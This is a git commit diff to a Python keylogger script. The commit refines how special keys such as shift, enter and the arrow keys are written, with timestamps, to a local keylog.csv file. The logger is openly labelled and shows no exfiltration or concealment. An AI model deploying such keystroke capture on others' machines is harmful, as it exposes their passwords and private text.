88d4a8a670ec99a29bc23eba79c82d8b4e66d386
Elgun1234 <112864674+Elgun1234@users.noreply.github.com>
2023-01-05 13:03:49 +0000

    Update main.py

--- main.py
+++ main.py
@@ -8,7 +8,7 @@ def on_press(key):
         x = datetime.datetime.now()
         dt = x.strftime("%Y-%m-%d %H:%M:%S")
         print(key.char)
-        print(type(key))
+
         f = open("keylog.csv", "a")
         f.write(f"{dt}  |  {key.char} \n")
 
@@ -18,10 +18,64 @@ def on_press(key):
     except AttributeError:
         x = datetime.datetime.now()
         dt = x.strftime("%Y-%m-%d %H:%M:%S")
-        print(f"{key}")
+        k = str(key)
+        if k == "Key.space":
+            k = " "
+        if k == "Key.shift":
+            k = "{shift}"
+        if k == "Key.backspace":
+            k = "{backspace}"
+        if k == "Key.enter":
+            k = "{enter}"
+        if k == "Key.tab":
+            k = "{tab}"
+        if k == "Key.alt_l":
+            k = "{left alt}"
+        if k == "Key.ctrl_l":
+            k = "{left control}"
+        if k == "Key.cmd":
+            k = "{command}"
+        if k == "Key.caps_lock":
+            k = "{caps lock}"
+        if k == "Key.shift_r":
+            k = "{right shift}"
+        if k == "Key.delete":
+            k = "{delete}"
+        if k == "Key.insert":
+            k = "{insert}"
+        if k == "Key.home":
+            k = "{home}"
+        if k == "Key.page_up":
+            k = "{page up}"
+        if k == "Key.page_down":
+            k = "{page down}"
+        if k == "Key.num_lock":
+            k = "{num lock}"
+        if k == "Key.left":
+            k = "{left}"
+        if k == "Key.right":
+            k = "{right}"
+        if k == "Key.up":
+            k = "{up}"
+        if k == "Key.down":
+            k = "{down}"
+        if k == "Key.pause":
+            k = "{pause}"
+        if k == "Key.scroll_lock":
+            k = "{scroll lock}"
+        if k == "Key.print_screen":
+            k = "{print screen}"
+        if k == "Key.alt_gr":
+            k = "{alt gr}"
+        if k == "Key.menu":
+            k = "{menu}"
+        if k == "Key.cmd_r":
+            k = "{right command}"
+        if k == "Key.ctrl_r":
+            k = "{right control}"
+        print(k)
         f = open("keylog.csv", "a")
-        print(type(key))
-        f.write(f"{dt}  |  {key}\n")
+        f.write(f"{dt}  |  {k}\n")
 
 
 def on_release(key):
@@ -42,7 +96,8 @@ with keyboard.Listener(
 # ...or, in a non-blocking fashion:
 '''
 listener = keyboard.Listener(
-    on_press=on_press,
+    on_press=on_press,#
+    
     on_release=on_release)
 listener.start()
 '''
